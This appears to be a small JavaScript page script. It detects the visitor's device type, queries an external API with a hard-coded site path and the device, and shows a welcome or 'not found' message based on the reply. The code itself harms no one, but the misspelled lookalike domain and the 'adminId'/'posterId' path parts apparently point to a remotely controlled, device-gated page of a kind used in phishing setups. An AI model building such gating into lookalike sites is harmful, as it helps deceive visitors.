// Configuration Variables
const API_URL = "https://erosback.vercel.app"; // Replace with your actual API URL
const site = "meggapursonel.online/34r/5t6/check"; // Replace with your actual site name

// Utility Function: Device Detection
function detectDevice(userAgent) {
  if (
    /Android|BlackBerry|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i.test(
      userAgent
    )
  ) {
    return "phone";
  }
  if (
    /Tablet|iPad|Playbook|Silk|Kindle|(Android(?!.*Mobile))/i.test(userAgent)
  ) {
    return "ipad";
  }
  return "desktop";
}

// Fetch Data and Render
async function verifyPage() {
  const userAgent = navigator.userAgent;
  const device = detectDevice(userAgent);
  const url = `${API_URL}/${site}/${device}`;

  const app = document.getElementById("app");

  try {
    const response = await fetch(url);
    if (!response.ok) throw new Error(`Failed to fetch: ${response.status}`);
    const data = await response.json();

    if (data?.success === "exists") {
      // Page exists: Render Home Component
      app.innerHTML = `<div>
        <h1>Welcome!</h1>
      
      </div>`;
    } else {
      // Page does not exist
      app.innerHTML = `<div>No Page Found!!</div>`;
    }
  } catch (error) {
    console.error("Error fetching data:", error);
    app.innerHTML = `<div>Something went wrong. Please try again later.</div>`;
  }
}

// Full URL: https://meggapursonel.online/34r/5t6/check
const urlPath = window.location.pathname; // Get the path part
console.log("Full Path:", urlPath); // Output: /34r/5t6/check

// Split the path into parts
const pathParts = urlPath.split("/").filter(Boolean); // Remove empty strings
console.log("Path Parts:", pathParts); // Output: ['34r', '5t6', 'check']

// Access the parameters
const adminId = pathParts[0]; // '34r'
const posterId = pathParts[1]; // '5t6'
const verifyId = pathParts[2]; // 'check'

console.log("Param 1:", adminId);
console.log("Param 2:", posterId);
console.log("Param 3:", verifyId);

// Call the function
verifyPage();
